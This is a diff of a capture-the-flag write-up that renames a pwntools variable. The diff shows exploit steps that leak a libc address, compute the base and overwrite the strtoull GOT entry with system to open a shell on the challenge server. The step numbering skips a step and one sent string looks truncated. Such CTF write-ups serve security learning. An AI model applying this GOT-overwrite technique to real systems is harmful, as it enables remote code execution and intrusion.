@@ -39,7 +39,7 @@ ch.recvuntil("to write?\n")
 2. Recieve the libc leak, and use it to calculate the base of libc. 
 
 ```python
-alarm = p.recvline()
+alarm = ch.recvline()
 alarm = int(alarm,16)
 libc_base = alarm - libc.sym['alarm']
 ```
@@ -47,11 +47,11 @@ libc_base = alarm - libc.sym['alarm']
 3. With the base of libc, calculate the address location of ``system``. Send the line of ``strtoull`` to be replaced by ``system``.
 
 ```python
-p.recvuntil("write to?\n")
-p.sendline(exe.got["strtoull"])
-p.recvuntil("to write?\n")
-p.sendline(libc_base + 0x554e0)
-p.sendline("/bin/")
+ch.recvuntil("write to?\n")
+ch.sendline(exe.got["strtoull"])
+ch.recvuntil("to write?\n")
+ch.sendline(libc_base + 0x554e0)
+ch.sendline("/bin/")
 ```
 
 5. Once we opened the shell, get the flag on their server!
